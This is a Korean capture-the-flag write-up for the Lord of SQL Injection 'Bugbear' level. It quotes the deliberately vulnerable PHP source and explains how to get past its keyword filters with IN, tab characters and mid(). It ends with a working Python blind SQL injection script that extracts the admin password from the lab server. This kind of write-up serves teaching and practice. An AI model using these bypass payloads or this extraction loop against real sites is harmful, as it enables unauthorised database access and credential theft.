## Lord of SQL Injection No. 13 - Bugbear
## 문제 출제 의도
like함수, substr함수, substring함수 없이 SQL문을 조작 가능 한지 확인한다.
## 소스 코드 분석
+ 소스 코드  
Bugbear의 소스코드는 다음과 같다.   
    ~~~ 
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
    if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
    if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
    $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - 금지 문자, 문자열
        * Get 방식으로 받은 no값에 prob _ . ( )중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
        * Get 방식으로 받은 pw값에 (single quote)가 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
        * Get 방식으로 받은 no값에 (single quote),substr,ascii,=(대입연산자),or,and중 하나라도 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
    - SQL문을 통해 받은 id 값이 0이 아니라면 "Hello Id"가 출력된다.
    - 풀이 성공 조건
        * 입력한 pw값과 실제 pw값이 일치해야 한다.
## 문제 해결
+ IN
    - 대입 연산자를 대체하여 그 자리에 동일하게 IN을 삽입하고 대입할 문자열을()소괄호로 묶어주어 사용하면 '=' 을 사용하지 않고 SQL문을 조작 가능하다.

+ 코드
    - 따라서 다음과 같은 코드를 작성하면 pw값을 알 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    for i in range(1, 9):
        for j in range(48, 127):
            url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="
            data = '1||id%09IN%09("admin")%26%26mid(pw,1,{})%09IN%09("{}")%23'.format(str(i), key + chr(j))
            print(data)
            # no=1||id%09IN%09("admin")%26%26MID(pw,1,1)%09IN%09("7")%09--%09-
            # data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
            re.add_header("Cookie", "PHPSESSID=lu2qch32sh6s8s57djgjra3hs3")
            res = urllib.request.urlopen(re) 
            if str(res.read()).find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ~~~
    - 이를 실행하면 pw=735c2773가 출력된다
    - 이를 URL뒤에 GET방식으로 입력하면 문제가 해결된다.